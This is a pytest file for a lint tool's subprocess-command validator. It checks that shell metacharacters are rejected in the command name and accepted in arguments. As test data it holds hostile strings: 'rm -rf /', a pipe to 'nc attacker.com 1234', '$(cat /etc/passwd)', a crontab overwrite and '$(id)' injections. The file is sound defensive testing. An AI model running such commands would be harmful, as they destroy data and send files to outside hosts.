"""Tests for subprocess command injection prevention.

These tests verify that the subprocess command validation properly blocks
shell metacharacters in the command name while allowing them in arguments
(since shell=False passes arguments literally without shell interpretation).
"""

from __future__ import annotations

import pytest
from assertpy import assert_that

from lintro.plugins.subprocess_executor import (
    UNSAFE_SHELL_CHARS,
    validate_subprocess_command,
)

# =============================================================================
# Tests for UNSAFE_SHELL_CHARS constant
# =============================================================================


def test_unsafe_chars_is_frozenset() -> None:
    """Verify UNSAFE_SHELL_CHARS is immutable (frozenset)."""
    assert_that(UNSAFE_SHELL_CHARS).is_instance_of(frozenset)


def test_unsafe_chars_contains_command_chaining_chars() -> None:
    """Verify command chaining characters are blocked."""
    chaining_chars = {";", "&", "|"}
    for char in chaining_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


def test_unsafe_chars_contains_redirection_chars() -> None:
    """Verify redirection characters are blocked."""
    redirection_chars = {">", "<"}
    for char in redirection_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


def test_unsafe_chars_contains_command_substitution_chars() -> None:
    """Verify command substitution characters are blocked."""
    substitution_chars = {"`", "$"}
    for char in substitution_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


def test_unsafe_chars_contains_escape_chars() -> None:
    """Verify escape and control characters are blocked."""
    escape_chars = {"\\", "\n", "\r"}
    for char in escape_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


def test_unsafe_chars_contains_glob_chars() -> None:
    """Verify glob pattern characters are blocked."""
    glob_chars = {"*", "?", "[", "]"}
    for char in glob_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


def test_unsafe_chars_contains_brace_expansion_chars() -> None:
    """Verify brace and subshell expansion characters are blocked."""
    brace_chars = {"{", "}", "(", ")"}
    for char in brace_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


def test_unsafe_chars_contains_other_shell_chars() -> None:
    """Verify other shell special characters are blocked."""
    other_chars = {"~", "!"}
    for char in other_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


# =============================================================================
# Tests for validate_subprocess_command function
# =============================================================================


def test_validate_subprocess_command_valid_simple_command() -> None:
    """Verify simple command passes validation."""
    validate_subprocess_command(["echo", "hello"])
    # No exception raised


def test_validate_subprocess_command_valid_command_with_flags() -> None:
    """Verify command with flags passes validation."""
    validate_subprocess_command(["ls", "-la", "--color=auto"])
    # No exception raised


def test_validate_subprocess_command_valid_command_with_path() -> None:
    """Verify command with file path passes validation."""
    validate_subprocess_command(["cat", "/path/to/file.txt"])
    # No exception raised


def test_validate_subprocess_command_empty_command_raises() -> None:
    """Verify empty command raises ValueError."""
    with pytest.raises(ValueError, match="non-empty list"):
        validate_subprocess_command([])


def test_validate_subprocess_command_none_command_raises() -> None:
    """Verify None command raises ValueError."""
    with pytest.raises(ValueError, match="non-empty list"):
        validate_subprocess_command(None)  # type: ignore[arg-type]


def test_validate_subprocess_command_string_command_raises() -> None:
    """Verify string command (not list) raises ValueError."""
    with pytest.raises(ValueError, match="non-empty list"):
        validate_subprocess_command("ls -la")  # type: ignore[arg-type]


def test_validate_subprocess_command_non_string_argument_raises() -> None:
    """Verify non-string argument raises ValueError."""
    with pytest.raises(ValueError, match="must be strings"):
        validate_subprocess_command(["ls", 123])  # type: ignore[list-item]


# =============================================================================
# Tests for unsafe characters in COMMAND NAME (should raise)
# =============================================================================


@pytest.mark.parametrize(
    ("char", "description"),
    [
        pytest.param(";", "semicolon command separator", id="semicolon"),
        pytest.param("&", "ampersand background/AND", id="ampersand"),
        pytest.param("|", "pipe", id="pipe"),
        pytest.param(">", "output redirection", id="redirect_out"),
        pytest.param("<", "input redirection", id="redirect_in"),
        pytest.param("`", "backtick command substitution", id="backtick"),
        pytest.param("$", "variable expansion", id="dollar"),
        pytest.param("\\", "escape character", id="backslash"),
        pytest.param("\n", "newline", id="newline"),
        pytest.param("\r", "carriage return", id="carriage_return"),
        pytest.param("*", "glob wildcard", id="asterisk"),
        pytest.param("?", "single char wildcard", id="question"),
        pytest.param("[", "character class start", id="bracket_open"),
        pytest.param("]", "character class end", id="bracket_close"),
        pytest.param("{", "brace expansion start", id="brace_open"),
        pytest.param("}", "brace expansion end", id="brace_close"),
        pytest.param("(", "subshell start", id="paren_open"),
        pytest.param(")", "subshell end", id="paren_close"),
        pytest.param("~", "home expansion", id="tilde"),
        pytest.param("!", "history expansion", id="exclamation"),
    ],
)
def test_validate_subprocess_command_unsafe_char_in_command_name_raises(
    char: str,
    description: str,
) -> None:
    """Verify each unsafe character in command name is blocked.

    Args:
        char: The unsafe character to test.
        description: Human-readable description of the character.
    """
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command([f"cmd{char}name", "arg"])


def test_validate_subprocess_command_injection_in_command_name() -> None:
    """Verify command injection in command name is blocked."""
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command(["ls;rm", "-la"])


# =============================================================================
# Tests for unsafe characters in ARGUMENTS (should NOT raise with shell=False)
# =============================================================================


@pytest.mark.parametrize(
    ("char", "description"),
    [
        pytest.param(";", "semicolon command separator", id="semicolon"),
        pytest.param("&", "ampersand background/AND", id="ampersand"),
        pytest.param("|", "pipe", id="pipe"),
        pytest.param(">", "output redirection", id="redirect_out"),
        pytest.param("<", "input redirection", id="redirect_in"),
        pytest.param("`", "backtick command substitution", id="backtick"),
        pytest.param("$", "variable expansion", id="dollar"),
        pytest.param("\\", "escape character", id="backslash"),
        pytest.param("*", "glob wildcard", id="asterisk"),
        pytest.param("?", "single char wildcard", id="question"),
        pytest.param("[", "character class start", id="bracket_open"),
        pytest.param("]", "character class end", id="bracket_close"),
        pytest.param("{", "brace expansion start", id="brace_open"),
        pytest.param("}", "brace expansion end", id="brace_close"),
        pytest.param("(", "subshell start", id="paren_open"),
        pytest.param(")", "subshell end", id="paren_close"),
        pytest.param("~", "home expansion", id="tilde"),
        pytest.param("!", "history expansion", id="exclamation"),
    ],
)
def test_validate_subprocess_command_special_char_in_argument_allowed(
    char: str,
    description: str,
) -> None:
    """Verify special characters in arguments are allowed with shell=False.

    Since lintro always uses shell=False, arguments are passed literally to
    the subprocess without shell interpretation. This allows legitimate use
    of special characters in file paths, glob patterns, and tool-specific
    syntax (e.g., Semgrep metavariables like $X).

    Args:
        char: The special character to test.
        description: Human-readable description of the character.
    """
    # Should NOT raise - special chars in args are safe with shell=False
    validate_subprocess_command(["echo", f"arg{char}value"])


def test_validate_subprocess_command_glob_pattern_in_argument_allowed() -> None:
    """Verify glob patterns in arguments are allowed."""
    # Common use case: passing include/exclude patterns to tools
    validate_subprocess_command(["semgrep", "--include", "*.py"])
    validate_subprocess_command(["ruff", "check", "src/**/*.py"])


def test_validate_subprocess_command_template_path_allowed() -> None:
    """Verify template paths with special chars are allowed."""
    # Common use case: Jinja2 templates, cookiecutter directories
    validate_subprocess_command(["cat", "templates/{{cookiecutter.name}}/file.py"])


def test_validate_subprocess_command_variable_syntax_allowed() -> None:
    """Verify tool-specific variable syntax is allowed."""
    # Common use case: Semgrep metavariables
    validate_subprocess_command(["semgrep", "--pattern", "$X = $Y"])


def test_validate_subprocess_command_dollar_in_filename_allowed() -> None:
    """Verify filenames with $ are allowed."""
    # Some projects have files with $ in names
    validate_subprocess_command(["cat", "test_$var.py"])


def test_validate_subprocess_command_shell_injection_args_safe_with_shell_false() -> (
    None
):
    """Verify shell injection attempts in args are safe with shell=False.

    These would be dangerous with shell=True, but are harmless with shell=False
    as the arguments are passed directly to the executable without
    shell interpretation.
    """
    # These look like injection attempts but are safe with shell=False
    validate_subprocess_command(["ls", "-la; rm -rf /"])
    validate_subprocess_command(["cat", "file | nc attacker.com 1234"])
    validate_subprocess_command(["echo", "`whoami`"])
    validate_subprocess_command(["echo", "$(cat /etc/passwd)"])
    validate_subprocess_command(["echo", "data > /etc/crontab"])


# =============================================================================
# argv0 shape: absolute paths are checked on their basename only (#2040)
# =============================================================================


@pytest.mark.parametrize(
    "argv0",
    [
        pytest.param("C:/Program Files (x86)/nodejs/prettier.cmd", id="win-x86"),
        pytest.param(r"C:\Program Files (x86)\nodejs\prettier.cmd", id="win-bslash"),
        pytest.param("//server/share (x86)/bin/prettier.cmd", id="unc"),
        pytest.param("/home/dev/~tools/bin/prettier", id="posix-tilde"),
        pytest.param("/opt/build!/bin/prettier", id="posix-bang"),
        pytest.param("/opt/{a}[b]/$x*?/bin/prettier", id="posix-glob-dirs"),
    ],
)
def test_validate_subprocess_command_absolute_argv0_checks_basename_only(
    argv0: str,
) -> None:
    """An absolute argv0 with shell characters in its directories is accepted.

    Args:
        argv0: Absolute command path whose directories hold shell characters.
    """
    accepted = True
    try:
        validate_subprocess_command([argv0, "--check", "a.ts"])
    except ValueError:
        accepted = False
    assert_that(accepted).described_as(argv0).is_true()


@pytest.mark.parametrize(
    "argv0",
    [
        pytest.param("prettier$(id)", id="bare-subst"),
        pytest.param("$(id)", id="bare-only-subst"),
        pytest.param("bin/prettier$(id)", id="relative-subst"),
        pytest.param("./node_modules (x86)/.bin/prettier", id="relative-dir-paren"),
        pytest.param("~/bin/prettier", id="home-relative"),
    ],
)
def test_validate_subprocess_command_non_absolute_argv0_checked_whole(
    argv0: str,
) -> None:
    """A bare or relative argv0 is still checked character by character.

    Args:
        argv0: Command name that is not an absolute path.
    """
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command([argv0])


@pytest.mark.parametrize(
    "argv0",
    [
        pytest.param("/usr/local/bin/prettier$(id)", id="posix"),
        pytest.param("C:/Program Files (x86)/nodejs/prettier;calc.cmd", id="win"),
    ],
)
def test_validate_subprocess_command_absolute_argv0_unsafe_basename_rejected(
    argv0: str,
) -> None:
    """The basename of an absolute argv0 keeps the full character check.

    Args:
        argv0: Absolute command path with a shell character in its basename.
    """
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command([argv0])
